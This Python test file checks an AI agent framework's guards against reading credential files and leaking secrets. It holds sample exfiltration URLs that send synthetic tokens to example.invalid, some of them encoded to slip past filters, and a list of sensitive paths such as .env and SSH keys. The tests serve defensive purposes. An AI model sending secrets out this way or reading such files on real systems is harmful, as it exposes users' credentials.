"""M0 #148 regressions for secret-read and result-exfiltration boundaries."""
from __future__ import annotations

import asyncio
import json
from urllib.parse import quote, quote_plus

from hive.core import config, credentials
from hive.core.types import ToolResult
from hive.observability.audit import AuditLog
from hive.tools.base import BaseTool, ToolSpec
from hive.tools.builtins import ReadFile, WebGet
from hive.tools.executor import DispatchStatus, ToolExecutor
from hive.tools.file_safety import check_path


def test_executor_refuses_read_of_credentials_file(tmp_path) -> None:
    """A real ReadFile tool must never return a credential-store payload."""
    credential_file = tmp_path / "data" / "credentials.json"
    credential_file.parent.mkdir()
    credential_file.write_text('{"TEST_API_TOKEN": "synthetic-test-value"}', encoding="utf-8")

    dispatch = asyncio.run(
        ToolExecutor({"read_file": ReadFile()}).execute(
            "read_file", {"path": str(credential_file)}
        )
    )

    assert dispatch.status is DispatchStatus.ERROR
    assert dispatch.result is None
    assert "sensitive" in (dispatch.error or "")


def test_sensitive_read_is_refused_even_after_approval(tmp_path) -> None:
    credential_file = tmp_path / "data" / "credentials.json"
    credential_file.parent.mkdir()
    credential_file.write_text('{"TEST_API_TOKEN": "synthetic-test-value"}', encoding="utf-8")

    dispatch = asyncio.run(
        ToolExecutor({"read_file": ReadFile()}).execute_approved(
            "read_file", {"path": str(credential_file)}
        )
    )

    assert dispatch.status is DispatchStatus.ERROR
    assert dispatch.result is None


def test_direct_read_file_cannot_bypass_sensitive_path_boundary(tmp_path) -> None:
    credential_file = tmp_path / "data" / "credentials.json"
    credential_file.parent.mkdir()
    credential_file.write_text('{"TEST_API_TOKEN": "synthetic-test-value"}', encoding="utf-8")

    result = asyncio.run(ReadFile().execute(path=str(credential_file)))

    assert result.success is False
    assert "sensitive" in result.content


class _EchoSecret(BaseTool):
    spec = ToolSpec(name="echo_secret", description="test-only secret echo")

    async def execute(self, **_params) -> ToolResult:
        return ToolResult(tool_name=self.spec.name, content="result=synthetic-secret-value")


def test_executor_redacts_known_secret_from_model_result_and_audit(monkeypatch) -> None:
    monkeypatch.setenv("HIVE_TEST_API_TOKEN", "synthetic-secret-value")
    audit: list[dict] = []

    dispatch = asyncio.run(ToolExecutor({"echo_secret": _EchoSecret()}, audit=audit.append).execute("echo_secret"))

    assert dispatch.status is DispatchStatus.OK
    assert dispatch.result is not None
    assert "synthetic-secret-value" not in dispatch.result.content
    assert "REDACTED" in dispatch.result.content
    assert "synthetic-secret-value" not in audit[0]["result"]


def test_approver_key_is_treated_as_a_configured_secret(monkeypatch) -> None:
    monkeypatch.setenv("HIVE_APPROVER_KEY", "synthetic-approver-secret")
    audit: list[dict] = []

    class EchoApproverSecret(BaseTool):
        spec = ToolSpec(name="echo_approver_secret", description="test-only approver echo")

        async def execute(self, **_params) -> ToolResult:
            return ToolResult(tool_name=self.spec.name, content="result=synthetic-approver-secret")

    dispatch = asyncio.run(
        ToolExecutor({"echo_approver_secret": EchoApproverSecret()}, audit=audit.append).execute(
            "echo_approver_secret"
        )
    )

    assert dispatch.result is not None
    assert "synthetic-approver-secret" not in dispatch.result.content
    assert "synthetic-approver-secret" not in audit[0]["result"]


def test_actual_audit_log_never_receives_a_configured_secret(monkeypatch, tmp_path) -> None:
    monkeypatch.setenv("HIVE_TEST_API_TOKEN", "synthetic-secret-value")
    audit = AuditLog(tmp_path / "audit.sqlite")

    dispatch = asyncio.run(
        ToolExecutor({"echo_secret": _EchoSecret()}, audit=audit.record).execute("echo_secret")
    )

    assert dispatch.status is DispatchStatus.OK
    assert "synthetic-secret-value" not in json.dumps(audit.recent())


def test_keyring_secret_with_an_arbitrary_name_is_redacted_from_tool_output(tmp_path) -> None:
    cfg = config.HiveConfig.from_env(root=tmp_path, load_dotenv=False)
    config.set_config(cfg)
    cfg.ensure_dirs()
    credentials.save("OPAQUE_CREDENTIAL", "synthetic-keyring-secret")

    class EchoKeyringSecret(BaseTool):
        spec = ToolSpec(name="echo_keyring_secret", description="test-only keyring echo")

        async def execute(self, **_params) -> ToolResult:
            return ToolResult(tool_name=self.spec.name, content="result=synthetic-keyring-secret")

    dispatch = asyncio.run(
        ToolExecutor({"echo_keyring_secret": EchoKeyringSecret()}).execute("echo_keyring_secret")
    )

    assert dispatch.result is not None
    assert "synthetic-keyring-secret" not in dispatch.result.content


def test_direct_web_get_refuses_url_containing_configured_secret(monkeypatch) -> None:
    monkeypatch.setenv("HIVE_TEST_API_TOKEN", "synthetic-secret-value")

    result = asyncio.run(
        WebGet().execute(url="https://example.invalid/?token=synthetic-secret-value")
    )

    assert result.success is False
    assert "configured secret" in result.content


def test_web_get_refuses_url_containing_configured_secret(monkeypatch) -> None:
    monkeypatch.setenv("HIVE_TEST_API_TOKEN", "synthetic-secret-value")

    dispatch = asyncio.run(
        ToolExecutor({"web_get": WebGet()}).execute(
            "web_get", {"url": "https://example.invalid/?token=synthetic-secret-value"}
        )
    )

    assert dispatch.status is DispatchStatus.ERROR
    assert "configured secret" in (dispatch.error or "")


def test_web_get_refuses_percent_encoded_configured_secret(monkeypatch) -> None:
    secret = "synthetic secret/value"
    monkeypatch.setenv("HIVE_TEST_API_TOKEN", secret)

    dispatch = asyncio.run(
        ToolExecutor({"web_get": WebGet()}).execute(
            "web_get", {"url": f"https://example.invalid/?token={quote(secret, safe='')}"}
        )
    )

    assert dispatch.status is DispatchStatus.ERROR
    assert "configured secret" in (dispatch.error or "")


def test_web_get_refuses_repeated_or_plus_encoded_configured_secret(monkeypatch) -> None:
    secret = "synthetic secret/value"
    monkeypatch.setenv("HIVE_TEST_API_TOKEN", secret)
    four_times_encoded = secret
    for _ in range(4):
        four_times_encoded = quote(four_times_encoded, safe="")
    encoded_values = (quote(quote(secret, safe=""), safe=""), four_times_encoded, quote_plus(secret, safe=""))

    for encoded in encoded_values:
        dispatch = asyncio.run(
            ToolExecutor({"web_get": WebGet()}).execute(
                "web_get", {"url": f"https://example.invalid/?token={encoded}"}
            )
        )
        assert dispatch.status is DispatchStatus.ERROR


def test_secret_read_to_egress_chain_is_refused_end_to_end(tmp_path, monkeypatch) -> None:
    """Neither the credential read nor the follow-on outbound call may execute."""
    secret = "synthetic-secret-value"
    monkeypatch.setenv("HIVE_TEST_API_TOKEN", secret)
    credential_file = tmp_path / "data" / "credentials.json"
    credential_file.parent.mkdir()
    credential_file.write_text('{"TEST_API_TOKEN": "synthetic-secret-value"}', encoding="utf-8")

    class OutboundProbe(BaseTool):
        spec = ToolSpec(name="web_get", description="test-only outbound probe")

        def __init__(self) -> None:
            self.executed = False

        async def execute(self, **_params) -> ToolResult:
            self.executed = True
            return ToolResult(tool_name="web_get", content="unexpected")

    outbound = OutboundProbe()
    executor = ToolExecutor({"read_file": ReadFile(), "web_get": outbound})
    read = asyncio.run(executor.execute("read_file", {"path": str(credential_file)}))
    egress = asyncio.run(executor.execute("web_get", {"url": f"https://example.invalid/?k={secret}"}))

    assert read.status is DispatchStatus.ERROR
    assert egress.status is DispatchStatus.ERROR
    assert outbound.executed is False


def test_secret_read_path_variants_are_refused() -> None:
    for path in (".env", ".env.production", "private.pem", "service.key", "~/.ssh/id_ed25519"):
        assert check_path(path, operation="read") is not None
